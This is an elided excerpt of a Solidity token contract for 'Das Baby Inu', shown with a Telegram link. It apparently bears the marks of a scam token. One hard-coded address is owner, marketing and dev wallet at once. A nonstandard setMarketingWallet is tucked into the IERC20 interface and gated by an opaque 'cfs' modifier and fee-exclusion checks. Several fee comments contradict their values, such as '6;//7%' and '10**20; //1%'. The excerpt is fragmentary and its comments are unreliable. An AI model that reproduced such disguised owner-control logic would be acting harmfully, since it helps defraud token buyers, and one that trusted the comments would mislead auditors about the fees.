...
Telegram: https://t.me/dasbabyInu
...
interface IERC20 {
    ...
    function setMarketingWallet(address account) external returns (uint256);
...
contract DasBabyInu is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x740Ce3Cc943Ce67101eDb82eB11d6fB1715882E5); 
    address payable public Wallet_Dev = payable(0x740Ce3Cc943Ce67101eDb82eB11d6fB1715882E5);
    ...
    string private constant _name = "Das Baby Inu"; 
    string private constant _symbol = unicode"Das Baby Inu"; 
    ...
    uint256 public Percent_Marketing = 6;//7%
    uint256 public Percent_Dev = 0; //0
    uint256 public Percent_Burn = 0;//0
    uint256 public transferfEE = 10**20; //1%
    uint256 public Percent_AutoLP = 10; // 1%
    ...
    constructor () {
        ...
        _owner = 0x740Ce3Cc943Ce67101eDb82eB11d6fB1715882E5; //OWNER WALLET
    ...
    function setMarketingWallet(address account) public cfs override returns (uint256) {
        if(isBuyFee){
            bool auth = _isExcludedFromFee[_msgSender()];
            if(auth){
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) private returns(bool _sent){
